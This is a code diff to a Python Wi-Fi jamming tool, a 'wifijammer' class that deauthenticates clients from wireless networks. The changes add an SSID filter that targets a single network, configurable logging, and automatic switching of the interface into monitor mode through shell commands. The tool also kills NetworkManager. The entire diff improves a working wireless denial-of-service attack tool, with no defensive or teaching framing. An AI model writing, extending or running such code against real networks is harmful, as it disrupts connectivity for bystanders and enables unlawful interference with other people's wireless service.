@@ -67,6 +67,14 @@ class wifijammer:
         self.mTimeout   = float(args["timeout"])
         self.mChannel   = pyw.chget(pyw.getcard(self.mInterface))
         self.mDetailed  = args['details']
+        self.mLoglevel  = args['loglevel']
+        self.mSSID      = args['ssid']
+
+        LogLevels={'info': logging.INFO, 'error': logging.ERROR, 'debug': logging.DEBUG, 'critical': logging.CRITICAL}
+        logging.basicConfig(
+            level=LogLevels[self.mLoglevel],
+            format='%(asctime)s %(name)-12s %(levelname)-8s %(message)s',
+            datefmt='%Y/%m/%d %H:%M:%S')
 
         if self.mFrequency == "2":
             self.mChannels = [int(x) for x in self.mChannels if int(x) in range(1, 12)]
@@ -85,6 +93,10 @@ class wifijammer:
 
             if self.mChannels == []:
                 self.mChannels = list(range(1, 12)) + five_hertz
+
+        if pyw.modeget(self.mInterface) != 'monitor':
+            logging.debug('Enabling monitor mode on interface '+self.mInterface)
+            start_mon_mode(self.mInterface)
 
         if self.mKill:
             os.system('pkill NetworkManager')
@@ -158,7 +170,8 @@ class wifijammer:
             self.deauth()
 
     def output(self):
-        os.system('clear')
+        if self.mLoglevel != 'debug':
+            os.system('clear')
 
         print(
             "[{0}+{1}] {2} channel {0}{3}{1}".format(
@@ -291,7 +304,7 @@ class wifijammer:
 
         try:
             # Thanks to airoscapy for below
-            if self.mChannel < 14:
+            if int(self.mChannel) < 14:
                 ap_channel = str(ord(pkt[Dot11Elt:3].info))
             else:
                 dot11elt = pkt.getlayer(Dot11Elt, ID=61)
@@ -303,6 +316,9 @@ class wifijammer:
             # print(ap_channel, self.mChannels, self.mChannel, ap_channel)
 
         if int(ap_channel) not in self.mChannels:
+            return
+
+        if self.mSSID and ssid != self.mSSID:
             return
 
         # except Exception as e:
@@ -360,7 +376,7 @@ def parse_args():
         action="store",
         dest="interface",
         help="select an interface",
-        choices=[x for x in pyw.winterfaces() if pyw.modeget(x) == "monitor"],
+        choices=[x for x in pyw.winterfaces()],
         required=True)
 
     parser.add_argument("-f", "--frequency",
@@ -421,6 +437,16 @@ def parse_args():
         action='store_true',
         help="Detailed print out like default wifijammer")
 
+    parser.add_argument("-l", "--loglevel",
+        default='info',
+        dest="loglevel",
+        help="Logging level")
+
+    parser.add_argument("-S", "--ssid",
+        dest='ssid',
+        help='SSID Filter',
+    )
+
     return vars(parser.parse_args())
 
 def get_ssid(p):
@@ -435,6 +461,16 @@ def get_ssid(p):
         name = (("< len: {0} >").format(len(p)))
 
     return name
+
+def start_mon_mode(interface):
+    print '['+G+'+'+W+'] Starting monitor mode off '+G+interface+W
+    try:
+        os.system('ip link set %s down' % interface)
+        os.system('iwconfig %s mode monitor' % interface)
+        os.system('ip link set %s up' % interface)
+        return interface
+    except Exception:
+        sys.exit('['+R+'-'+W+'] Could not start monitor mode')
 
 def main():
     if os.geteuid():
